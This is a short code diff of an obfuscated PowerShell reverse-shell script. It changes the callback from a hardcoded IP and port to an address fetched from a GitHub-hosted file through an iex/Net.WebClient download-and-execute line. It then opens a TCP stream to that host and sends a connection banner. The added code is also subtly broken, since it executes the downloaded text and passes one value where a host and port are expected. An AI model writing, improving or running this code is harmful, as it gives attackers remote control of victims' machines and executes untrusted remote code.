@@ -1,4 +1,5 @@
-$KLK = New-Object System.Net.Sockets.TCPClient('192.168.1.43','93');
+$IP = powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://github.com/blueface5/ps1Testing/blob/main/IP.txt')"
+$KLK = New-Object System.Net.Sockets.TCPClient($IP);
 $PLP = $KLK.GetStream();
 [byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};
 $VVCCA = ([text.encoding]::UTF8).GetBytes("Succesfuly connected .`n`n")
